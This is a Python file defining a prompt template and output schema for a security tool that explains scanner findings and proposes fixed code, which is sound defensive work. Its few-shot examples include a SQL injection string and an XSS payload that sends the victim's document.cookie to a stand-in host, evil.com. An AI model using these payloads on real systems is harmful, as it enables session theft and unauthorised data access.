"""
CoDude — Security Enhancement Prompt Template (Day 12)

Specialized prompt for the ExploitExplainer service. Given a security
finding from the static OWASP scanner, this prompt asks the LLM to:

    (a) Write a 2-sentence plain-English exploit scenario
    (b) Provide a corrected code snippet that fixes the vulnerability

Template variables:
    {vulnerable_code}   — The vulnerable code snippet (2 lines of context)
    {owasp_category}    — OWASP Top 10 category (e.g. "A03:2021 – Injection")
    {cwe_id}            — CWE identifier (e.g. "CWE-89")
    {finding_message}   — The original finding message from the scanner
    {suggestion}        — The original remediation suggestion
    {language}          — Programming language of the code

Cost control: This prompt is ONLY invoked for critical/high severity findings.
Medium/low findings use the static scanner output as-is.

Note: All literal curly braces in JSON/code examples are doubled ({{ }}) to
escape LangChain's f-string template parser.
"""

from pydantic import BaseModel, Field
from langchain_core.prompts import ChatPromptTemplate


# ── Structured Output Schema ────────────────────────────────────────────────

class ExploitEnhancementSchema(BaseModel):
    """Schema for the LLM's exploit explanation response.

    Fields:
        exploit_scenario: A 2-sentence plain-English description of how an
                          attacker could exploit this vulnerability.
        remediation_code: A corrected code snippet that fixes the vulnerability.
                          Must be syntactically valid and drop-in ready.
    """

    exploit_scenario: str = Field(
        ...,
        description=(
            "A 2-sentence plain-English explanation of how an attacker could "
            "exploit this vulnerability. Be specific about the attack vector "
            "and potential impact."
        ),
    )
    remediation_code: str = Field(
        ...,
        description=(
            "A corrected code snippet that fixes the vulnerability. "
            "Must be syntactically valid, drop-in ready, and include "
            "only the relevant fixed lines (not the entire file)."
        ),
    )


# ── System Message ──────────────────────────────────────────────────────────

SECURITY_ENHANCEMENT_SYSTEM = """\
You are a **senior application security engineer** specialising in \
vulnerability explanation and remediation. Your role is to help developers \
understand security findings and fix them quickly.

## Your Task

Given a security vulnerability found by a static analyser, you must:

1. **Explain the exploit** in exactly 2 sentences of plain English that any \
developer can understand. Be specific — mention the exact attack payload \
or technique an attacker would use, and describe the impact (data theft, \
RCE, privilege escalation, etc.).

2. **Provide a corrected code snippet** that fixes the vulnerability. The \
snippet must:
   - Be syntactically valid in the target language
   - Be a drop-in replacement for the vulnerable code
   - Follow security best practices (parameterised queries, input validation, \
proper encoding, etc.)
   - Include brief inline comments explaining the security fix

## Output Rules

- exploit_scenario: Exactly 2 sentences. First sentence describes the attack. \
Second sentence describes the impact.
- remediation_code: Only the fixed code lines (not the entire file). Include \
2 lines of context before/after the fix where helpful.
- Do NOT include markdown code fences in the remediation_code field — return \
raw code only.

## Examples

### SQL Injection Fix
Vulnerable code: `query = f"SELECT * FROM users WHERE id = '{{user_id}}'"`
exploit_scenario: "An attacker could submit `' OR 1=1 --` as the user ID, \
causing the query to return all rows from the users table. This bypasses \
authentication and exposes all user records including passwords and PII."
remediation_code: "# Use parameterised queries to prevent SQL injection\\n\
cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))"

### XSS Fix
Vulnerable code: `res.send('<h1>Results for: ' + query + '</h1>')`
exploit_scenario: "An attacker could inject `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` \
as the search query, causing the victim's browser to send their session cookie \
to the attacker's server. This enables full session hijacking and account takeover."
remediation_code: "// Escape HTML entities before rendering user input\\n\
const escaped = query.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');\\n\
res.send(`<h1>Results for: ${{escaped}}</h1>`);"
"""

# ── Human Message ───────────────────────────────────────────────────────────

SECURITY_ENHANCEMENT_HUMAN = """\
A static security scanner found the following vulnerability in **{language}** code.

## Finding Details
- **OWASP Category**: {owasp_category}
- **CWE ID**: {cwe_id}
- **Scanner Message**: {finding_message}
- **Scanner Suggestion**: {suggestion}

## Vulnerable Code (with context)
```{language}
{vulnerable_code}
```

Provide:
1. A 2-sentence exploit scenario explaining exactly how an attacker would \
exploit this vulnerability and what damage it causes.
2. A corrected code snippet that fixes the vulnerability with inline comments \
explaining the security fix.

Return your response as structured JSON matching the required schema.\
"""

# ── Composed Prompt ─────────────────────────────────────────────────────────

SECURITY_ENHANCEMENT_PROMPT = ChatPromptTemplate.from_messages([
    ("system", SECURITY_ENHANCEMENT_SYSTEM),
    ("human", SECURITY_ENHANCEMENT_HUMAN),
])
